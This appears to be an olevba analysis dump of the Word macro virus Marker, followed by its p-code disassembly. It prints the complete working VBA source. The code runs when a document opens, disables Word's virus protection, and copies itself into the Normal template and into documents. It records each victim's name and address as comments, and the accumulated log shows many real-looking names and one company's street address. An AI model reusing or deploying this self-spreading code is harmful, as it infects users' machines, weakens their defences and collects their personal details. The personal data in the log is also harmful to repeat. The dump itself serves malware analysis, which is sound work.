olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ga
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ga - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Влом было макросы писать
































































Private Sub Document_Open()

On Error Resume Next

Const test = "Это не вирус. Просто прикол ;)"

'Объявление переменных
Dim SaveDocument, SaveNormalTemplate, DocumentPrepared, NormalTemplatePrepared As Boolean
Dim ad, nt As Object
Dim Code, UserAddress, LogData, LogFile As String

'Инициализация переменных
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
NormalTemplatePrepared = nt.CodeModule.Find(test, 0, 0, 0, 0)

Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
DocumentPrepared = ad.CodeModule.Find(test, 0, 0, 0, 0)

'Чуток меняем опции для оптимизации работы
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False

'Заражаем NormalTemplate
If (ad.CodeModule.Find(test, 0, 0, 0, 0) = True And _
    nt.CodeModule.Find(test, 0, 0, 0, 0) = False) Then
   
    Code = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i
   
    Code = Code & Chr(13) & _
              "' " & Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)
 
    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString Code
End If

'Заражаем активный документ
If nt.CodeModule.Find(test, 0, 0, 0, 0) = True And _
  ad.CodeModule.Find(test, 0, 0, 0, 0) = False Then

  Code = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
  ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
  ad.CodeModule.AddFromString Code
End If

'если пятница, тринадцатое, то хана тачке
If (Day(Now()) = 13) And (WeekDay(Now()) = 6) Then
  Value = MsgBox("Сегодня пятница, 13. Следовательно, на вашей тачке страшный вирус! Хи-хи :) Будем лечить?", vbYesNo)
  If Value = vbYes Then
    MsgBox ("А-а-а-а!!! Не лечится... Хана тачке :(((")
  Else
    MsgBox ("Правильное решение. Тупая шутка")
  End If
End If

  If Right(Application.UserName, 4) <> "лох!" Then
    Application.UserName = Application.UserName + " - лох!"
  End If
  ActiveDocument.Save
  
End Sub


























































'Фух, наконец-то клавишу Enter отжал :o)
' Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet - лох!
'



' Saturday, 28 Nov 1998
' MARK B. SEAY - лох!
'



' Friday, 4 Dec 1998
' UPS - лох!
'



' Thursday, 17 Dec 1998
' WRO - лох!
'



' Tuesday, 22 Dec 1998
' bd04619 - лох!
'



' Monday, 4 Jan 1999
' ss04789 - лох!
'



' Wednesday, 6 Jan 1999
' JDIETZ - лох!
'



' Saturday, 23 Jan 1999
' W95INST - лох!
'



' Tuesday, 26 Jan 1999
' cbreivis - лох!
'



' Monday, 1 Feb 1999
' C & L User - лох!
'



' Friday, 5 Feb 1999
' Davidson - лох!
'



' Monday, 8 Feb 1999
' uperstl
'



' Tuesday, 16 Feb 1999
' rkeeble - лох!
'



' Thursday, 18 Feb 1999
' pcosgrov - лох!
'



' Friday, 19 Feb 1999
' lyoung - лох!
'



' Tuesday, 23 Feb 1999
' Giuseppe Bacco - лох!
'



' Tuesday, 23 Feb 1999
' jstewart - лох!
'



' вторник, 2 мар 1999
' Korneyev - лох!
' Україна, 252030, м.Київ, вул. Б.Хмельницького, 46
' ТОВ "Перспектива-ТБ"



' понедельник, 3 мар 1997
' Administrator - лох!
'



' понедельник, 22 мар 1999
' den - лох!
'



' пятница, 2 апр 1999
' Дядюн - лох!
'



' пятница, 9 апр 1999
' AMI - лох!
'



' середа, 21 Кві 1999
' sFire - лох!
'



' воскресенье, 16 май 1999
' все кому не лень - лох!
'



' понедельник, 17 май 1999
' максим - лох!
'



' среда, 26 май 1999
' Сергей - лох!
'



' среда, 26 май 1999
' Sergey - лох!
'



' среда, 2 июн 1999
' АВЕРЬЯНОВА ДАРЬЯ ПЕТРОВНА - лох!
'



' четверг, 15 июл 1999
' st06 - лох!
'



' вторник, 20 июл 1999
' ST5 - лох!
'



' понедельник, 1 янв 1996
' Averin Dm. G. - лох!
'



' понедельник, 4 окт 1999
' V.Strunilin - лох!
'



' пятница, 26 ноя 1999
' - лох!
'



' понедельник, 20 дек 1999
' - лох!
'



' среда, 22 дек 1999
' sv - лох!
'



' вторник, 28 дек 1999
' sv - лох!
'



' вторник, 22 фев 2000
' Александров  С.А. - лох!
'



' воскресенье, 28 май 2000
' Мормуль Сергей Петрович - лох!
'



' понедельник, 11 сен 2000
' Мормуль Сергей Петрович - лох!
'



' воскресенье, 1 окт 2000
' МСП - лох!
'



' вторник, 28 ноя 2000
' Лисицкий Игорь Сергеевич - лох!
'



' среда, 6 дек 2000
' STV
'



' пятница, 12 янв 2001
' МИЩЕНКО В В
'



' вторник, 16 янв 2001
' МИЩЕНКО В В - лох!
'



' четверг, 18 янв 2001
' Room13 - лох!
'



' понедельник, 29 янв 2001
' КОРНЕЕВА ИРА
'



' вторник, 30 янв 2001
' POST
'



' вторник, 30 янв 2001
' Дежурная часть
'



' среда, 7 фев 2001
' YANKOVSKAYA
'



' четвер, 26 Кві 2001
' Татьяна
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.ga
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14690 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0018 "Влом было макросы писать"
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' 	FuncDefn (Private Sub Document_Open())
' Line #67:
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' Line #70:
' 	Dim (Const) 
' 	LitStr 0x001E "Это не вирус. Просто прикол ;)"
' 	VarDefn test
' Line #71:
' Line #72:
' 	QuoteRem 0x0000 0x0015 "Объявление переменных"
' Line #73:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentPrepared
' 	VarDefn NormalTemplatePrepared (As Boolean)
' Line #74:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #75:
' 	Dim 
' 	VarDefn Code
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #76:
' Line #77:
' 	QuoteRem 0x0000 0x0018 "Инициализация переменных"
' Line #78:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #79:
' 	Ld test 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplatePrepared 
' Line #80:
' Line #81:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #82:
' 	Ld test 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentPrepared 
' Line #83:
' Line #84:
' 	QuoteRem 0x0000 0x0029 "Чуток меняем опции для оптимизации работы"
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #88:
' Line #89:
' 	QuoteRem 0x0000 0x0017 "Заражаем NormalTemplate"
' Line #90:
' 	LineCont 0x0004 15 00 04 00
' 	Ld test 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld test 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #91:
' Line #92:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Code 
' Line #93:
' Line #94:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #95:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #96:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #97:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	ElseBlock 
' Line #100:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' Line #104:
' 	LineCont 0x000C 09 00 0E 00 17 00 0E 00 22 00 0E 00
' 	Ld Code 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Code 
' Line #105:
' Line #106:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #107:
' 	Ld Code 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #108:
' 	EndIfBlock 
' Line #109:
' Line #110:
' 	QuoteRem 0x0000 0x001A "Заражаем активный документ"
' Line #111:
' 	LineCont 0x0004 14 00 02 00
' 	Ld test 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld test 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #112:
' Line #113:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Code 
' Line #114:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #115:
' 	Ld Code 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #116:
' 	EndIfBlock 
' Line #117:
' Line #118:
' 	QuoteRem 0x0000 0x0028 "если пятница, тринадцатое, то хана тачке"
' Line #119:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #120:
' 	LitStr 0x0059 "Сегодня пятница, 13. Следовательно, на вашей тачке страшный вирус! Хи-хи :) Будем лечить?"
' 	Ld vbYesNo 
' 	ArgsLd MsgBox 0x0002 
' 	St Value 
' Line #121:
' 	Ld Value 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #122:
' 	LitStr 0x0028 "А-а-а-а!!! Не лечится... Хана тачке :((("
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #123:
' 	ElseBlock 
' Line #124:
' 	LitStr 0x001F "Правильное решение. Тупая шутка"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndIfBlock 
' Line #127:
' Line #128:
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0004 "лох!"
' 	Ne 
' 	IfBlock 
' Line #129:
' 	Ld Application 
' 	MemLd UserName 
' 	LitStr 0x0007 " - лох!"
' 	Add 
' 	Ld Application 
' 	MemSt UserName 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #132:
' Line #133:
' 	EndSub 
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' 	QuoteRem 0x0000 0x0027 "Фух, наконец-то клавишу Enter отжал :o)"
' Line #193:
' 	QuoteRem 0x0000 0x0016 " Saturday, 28 Nov 1998"
' Line #194:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #195:
' 	QuoteRem 0x0000 0x0013 " Blue Planet - лох!"
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0016 " Saturday, 28 Nov 1998"
' Line #201:
' 	QuoteRem 0x0000 0x0014 " MARK B. SEAY - лох!"
' Line #202:
' 	QuoteRem 0x0000 0x0000 ""
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' 	QuoteRem 0x0000 0x0013 " Friday, 4 Dec 1998"
' Line #207:
' 	QuoteRem 0x0000 0x000B " UPS - лох!"
' Line #208:
' 	QuoteRem 0x0000 0x0000 ""
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' 	QuoteRem 0x0000 0x0016 " Thursday, 17 Dec 1998"
' Line #213:
' 	QuoteRem 0x0000 0x000B " WRO - лох!"
' Line #214:
' 	QuoteRem 0x0000 0x0000 ""
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0015 " Tuesday, 22 Dec 1998"
' Line #219:
' 	QuoteRem 0x0000 0x000F " bd04619 - лох!"
' Line #220:
' 	QuoteRem 0x0000 0x0000 ""
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' 	QuoteRem 0x0000 0x0013 " Monday, 4 Jan 1999"
' Line #225:
' 	QuoteRem 0x0000 0x000F " ss04789 - лох!"
' Line #226:
' 	QuoteRem 0x0000 0x0000 ""
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' 	QuoteRem 0x0000 0x0016 " Wednesday, 6 Jan 1999"
' Line #231:
' 	QuoteRem 0x0000 0x000E " JDIETZ - лох!"
' Line #232:
' 	QuoteRem 0x0000 0x0000 ""
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' 	QuoteRem 0x0000 0x0016 " Saturday, 23 Jan 1999"
' Line #237:
' 	QuoteRem 0x0000 0x000F " W95INST - лох!"
' Line #238:
' 	QuoteRem 0x0000 0x0000 ""
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' 	QuoteRem 0x0000 0x0015 " Tuesday, 26 Jan 1999"
' Line #243:
' 	QuoteRem 0x0000 0x0010 " cbreivis - лох!"
' Line #244:
' 	QuoteRem 0x0000 0x0000 ""
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' 	QuoteRem 0x0000 0x0013 " Monday, 1 Feb 1999"
' Line #249:
' 	QuoteRem 0x0000 0x0012 " C & L User - лох!"
' Line #250:
' 	QuoteRem 0x0000 0x0000 ""
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' 	QuoteRem 0x0000 0x0013 " Friday, 5 Feb 1999"
' Line #255:
' 	QuoteRem 0x0000 0x0010 " Davidson - лох!"
' Line #256:
' 	QuoteRem 0x0000 0x0000 ""
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' 	QuoteRem 0x0000 0x0013 " Monday, 8 Feb 1999"
' Line #261:
' 	QuoteRem 0x0000 0x0008 " uperstl"
' Line #262:
' 	QuoteRem 0x0000 0x0000 ""
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' 	QuoteRem 0x0000 0x0015 " Tuesday, 16 Feb 1999"
' Line #267:
' 	QuoteRem 0x0000 0x000F " rkeeble - лох!"
' Line #268:
' 	QuoteRem 0x0000 0x0000 ""
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0016 " Thursday, 18 Feb 1999"
' Line #273:
' 	QuoteRem 0x0000 0x0010 " pcosgrov - лох!"
' Line #274:
' 	QuoteRem 0x0000 0x0000 ""
' Line #275:
' Line #276:
' Line #277:
' Line #278:
' 	QuoteRem 0x0000 0x0014 " Friday, 19 Feb 1999"
' Line #279:
' 	QuoteRem 0x0000 0x000E " lyoung - лох!"
' Line #280:
' 	QuoteRem 0x0000 0x0000 ""
' Line #281:
' Line #282:
' Line #283:
' Line #284:
' 	QuoteRem 0x0000 0x0015 " Tuesday, 23 Feb 1999"
' Line #285:
' 	QuoteRem 0x0000 0x0016 " Giuseppe Bacco - лох!"
' Line #286:
' 	QuoteRem 0x0000 0x0000 ""
' Line #287:
' Line #288:
' Line #289:
' Line #290:
' 	QuoteRem 0x0000 0x0015 " Tuesday, 23 Feb 1999"
' Line #291:
' 	QuoteRem 0x0000 0x0010 " jstewart - лох!"
' Line #292:
' 	QuoteRem 0x0000 0x0000 ""
' Line #293:
' Line #294:
' Line #295:
' Line #296:
' 	QuoteRem 0x0000 0x0014 " вторник, 2 мар 1999"
' Line #297:
' 	QuoteRem 0x0000 0x0010 " Korneyev - лох!"
' Line #298:
' 	QuoteRem 0x0000 0x0032 " Україна, 252030, м.Київ, вул. Б.Хмельницького, 46"
' Line #299:
' 	QuoteRem 0x0000 0x0015 " ТОВ "Перспектива-ТБ""
' Line #300:
' Line #301:
' Line #302:
' Line #303:
' 	QuoteRem 0x0000 0x0018 " понедельник, 3 мар 1997"
' Line #304:
' 	QuoteRem 0x0000 0x0015 " Administrator - лох!"
' Line #305:
' 	QuoteRem 0x0000 0x0000 ""
' Line #306:
' Line #307:
' Line #308:
' Line #309:
' 	QuoteRem 0x0000 0x0019 " понедельник, 22 мар 1999"
' Line #310:
' 	QuoteRem 0x0000 0x000B " den - лох!"
' Line #311:
' 	QuoteRem 0x0000 0x0000 ""
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' 	QuoteRem 0x0000 0x0014 " пятница, 2 апр 1999"
' Line #316:
' 	QuoteRem 0x0000 0x000D " Дядюн - лох!"
' Line #317:
' 	QuoteRem 0x0000 0x0000 ""
' Line #318:
' Line #319:
' Line #320:
' Line #321:
' 	QuoteRem 0x0000 0x0014 " пятница, 9 апр 1999"
' Line #322:
' 	QuoteRem 0x0000 0x000B " AMI - лох!"
' Line #323:
' 	QuoteRem 0x0000 0x0000 ""
' Line #324:
' Line #325:
' Line #326:
' Line #327:
' 	QuoteRem 0x0000 0x0014 " середа, 21 Кві 1999"
' Line #328:
' 	QuoteRem 0x0000 0x000D " sFire - лох!"
' Line #329:
' 	QuoteRem 0x0000 0x0000 ""
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' 	QuoteRem 0x0000 0x0019 " воскресенье, 16 май 1999"
' Line #334:
' 	QuoteRem 0x0000 0x0018 " все кому не лень - лох!"
' Line #335:
' 	QuoteRem 0x0000 0x0000 ""
' Line #336:
' Line #337:
' Line #338:
' Line #339:
' 	QuoteRem 0x0000 0x0019 " понедельник, 17 май 1999"
' Line #340:
' 	QuoteRem 0x0000 0x000E " максим - лох!"
' Line #341:
' 	QuoteRem 0x0000 0x0000 ""
' Line #342:
' Line #343:
' Line #344:
' Line #345:
' 	QuoteRem 0x0000 0x0013 " среда, 26 май 1999"
' Line #346:
' 	QuoteRem 0x0000 0x000E " Сергей - лох!"
' Line #347:
' 	QuoteRem 0x0000 0x0000 ""
' Line #348:
' Line #349:
' Line #350:
' Line #351:
' 	QuoteRem 0x0000 0x0013 " среда, 26 май 1999"
' Line #352:
' 	QuoteRem 0x0000 0x000E " Sergey - лох!"
' Line #353:
' 	QuoteRem 0x0000 0x0000 ""
' Line #354:
' Line #355:
' Line #356:
' Line #357:
' 	QuoteRem 0x0000 0x0012 " среда, 2 июн 1999"
' Line #358:
' 	QuoteRem 0x0000 0x0021 " АВЕРЬЯНОВА ДАРЬЯ ПЕТРОВНА - лох!"
' Line #359:
' 	QuoteRem 0x0000 0x0000 ""
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' 	QuoteRem 0x0000 0x0015 " четверг, 15 июл 1999"
' Line #364:
' 	QuoteRem 0x0000 0x000C " st06 - лох!"
' Line #365:
' 	QuoteRem 0x0000 0x0000 ""
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' 	QuoteRem 0x0000 0x0015 " вторник, 20 июл 1999"
' Line #370:
' 	QuoteRem 0x0000 0x000B " ST5 - лох!"
' Line #371:
' 	QuoteRem 0x0000 0x0000 ""
' Line #372:
' Line #373:
' Line #374:
' Line #375:
' 	QuoteRem 0x0000 0x0018 " понедельник, 1 янв 1996"
' Line #376:
' 	QuoteRem 0x0000 0x0015 " Averin Dm. G. - лох!"
' Line #377:
' 	QuoteRem 0x0000 0x0000 ""
' Line #378:
' Line #379:
' Line #380:
' Line #381:
' 	QuoteRem 0x0000 0x0018 " понедельник, 4 окт 1999"
' Line #382:
' 	QuoteRem 0x0000 0x0013 " V.Strunilin - лох!"
' Line #383:
' 	QuoteRem 0x0000 0x0000 ""
' Line #384:
' Line #385:
' Line #386:
' Line #387:
' 	QuoteRem 0x0000 0x0015 " пятница, 26 ноя 1999"
' Line #388:
' 	QuoteRem 0x0000 0x0007 " - лох!"
' Line #389:
' 	QuoteRem 0x0000 0x0000 ""
' Line #390:
' Line #391:
' Line #392:
' Line #393:
' 	QuoteRem 0x0000 0x0019 " понедельник, 20 дек 1999"
' Line #394:
' 	QuoteRem 0x0000 0x0007 " - лох!"
' Line #395:
' 	QuoteRem 0x0000 0x0000 ""
' Line #396:
' Line #397:
' Line #398:
' Line #399:
' 	QuoteRem 0x0000 0x0013 " среда, 22 дек 1999"
' Line #400:
' 	QuoteRem 0x0000 0x000A " sv - лох!"
' Line #401:
' 	QuoteRem 0x0000 0x0000 ""
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' 	QuoteRem 0x0000 0x0015 " вторник, 28 дек 1999"
' Line #406:
' 	QuoteRem 0x0000 0x000A " sv - лох!"
' Line #407:
' 	QuoteRem 0x0000 0x0000 ""
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' 	QuoteRem 0x0000 0x0015 " вторник, 22 фев 2000"
' Line #412:
' 	QuoteRem 0x0000 0x0019 " Александров  С.А. - лох!"
' Line #413:
' 	QuoteRem 0x0000 0x0000 ""
' Line #414:
' Line #415:
' Line #416:
' Line #417:
' 	QuoteRem 0x0000 0x0019 " воскресенье, 28 май 2000"
' Line #418:
' 	QuoteRem 0x0000 0x001F " Мормуль Сергей Петрович - лох!"
' Line #419:
' 	QuoteRem 0x0000 0x0000 ""
' Line #420:
' Line #421:
' Line #422:
' Line #423:
' 	QuoteRem 0x0000 0x0019 " понедельник, 11 сен 2000"
' Line #424:
' 	QuoteRem 0x0000 0x001F " Мормуль Сергей Петрович - лох!"
' Line #425:
' 	QuoteRem 0x0000 0x0000 ""
' Line #426:
' Line #427:
' Line #428:
' Line #429:
' 	QuoteRem 0x0000 0x0018 " воскресенье, 1 окт 2000"
' Line #430:
' 	QuoteRem 0x0000 0x000B " МСП - лох!"
' Line #431:
' 	QuoteRem 0x0000 0x0000 ""
' Line #432:
' Line #433:
' Line #434:
' Line #435:
' 	QuoteRem 0x0000 0x0015 " вторник, 28 ноя 2000"
' Line #436:
' 	QuoteRem 0x0000 0x0020 " Лисицкий Игорь Сергеевич - лох!"
' Line #437:
' 	QuoteRem 0x0000 0x0000 ""
' Line #438:
' Line #439:
' Line #440:
' Line #441:
' 	QuoteRem 0x0000 0x0012 " среда, 6 дек 2000"
' Line #442:
' 	QuoteRem 0x0000 0x0004 " STV"
' Line #443:
' 	QuoteRem 0x0000 0x0000 ""
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' 	QuoteRem 0x0000 0x0015 " пятница, 12 янв 2001"
' Line #448:
' 	QuoteRem 0x0000 0x000C " МИЩЕНКО В В"
' Line #449:
' 	QuoteRem 0x0000 0x0000 ""
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' 	QuoteRem 0x0000 0x0015 " вторник, 16 янв 2001"
' Line #454:
' 	QuoteRem 0x0000 0x0013 " МИЩЕНКО В В - лох!"
' Line #455:
' 	QuoteRem 0x0000 0x0000 ""
' Line #456:
' Line #457:
' Line #458:
' Line #459:
' 	QuoteRem 0x0000 0x0015 " четверг, 18 янв 2001"
' Line #460:
' 	QuoteRem 0x0000 0x000E " Room13 - лох!"
' Line #461:
' 	QuoteRem 0x0000 0x0000 ""
' Line #462:
' Line #463:
' Line #464:
' Line #465:
' 	QuoteRem 0x0000 0x0019 " понедельник, 29 янв 2001"
' Line #466:
' 	QuoteRem 0x0000 0x000D " КОРНЕЕВА ИРА"
' Line #467:
' 	QuoteRem 0x0000 0x0000 ""
' Line #468:
' Line #469:
' Line #470:
' Line #471:
' 	QuoteRem 0x0000 0x0015 " вторник, 30 янв 2001"
' Line #472:
' 	QuoteRem 0x0000 0x0005 " POST"
' Line #473:
' 	QuoteRem 0x0000 0x0000 ""
' Line #474:
' Line #475:
' Line #476:
' Line #477:
' 	QuoteRem 0x0000 0x0015 " вторник, 30 янв 2001"
' Line #478:
' 	QuoteRem 0x0000 0x000F " Дежурная часть"
' Line #479:
' 	QuoteRem 0x0000 0x0000 ""
' Line #480:
' Line #481:
' Line #482:
' Line #483:
' 	QuoteRem 0x0000 0x0012 " среда, 7 фев 2001"
' Line #484:
